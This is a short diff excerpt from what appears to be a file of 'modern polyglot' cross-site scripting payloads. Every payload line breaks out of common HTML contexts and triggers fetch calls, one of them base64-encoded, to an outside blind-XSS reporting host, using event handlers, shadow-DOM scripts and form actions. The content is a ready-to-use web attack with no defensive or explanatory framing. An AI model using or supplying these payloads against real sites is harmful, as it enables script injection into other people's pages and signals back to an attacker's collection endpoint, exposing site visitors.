@@ -5,8 +5,6 @@ very stromg modern polygot
 */</script></style></noscript></title></textarea><math><mi onerror=fetch`//xss.report/c/hellomaster` mathvariant="normal">X</mi></math>
 </script><template shadowrootmode="open"><script defer>fetch('//xss.report/c/hellomaster')</script></template>
 */</script></style></title></textarea></noscript></noframes></noembed><template shadowrootmode="open"><slot onslotchange=fetch`//xss.report/c/hellomaster`></slot></template><body onunhandledrejection="fetch(atob('Ly94c3MucmVwb3J0L2Mv aGVsbG9tYXN0ZXI='))"><keygen autofocus onfocus=fetch`//xss.report/c/hellomaster`><isindex type=image formaction="//xss.report/c/hellomaster"><math><maction href="//xss.report/c/hellomaster">hover</maction><mi onerror=fetch`//xss.report/c/hellomaster`>X</mi></math><script>fetch('//invalid-to-trigger')</script>
-
-
 ```
 
 
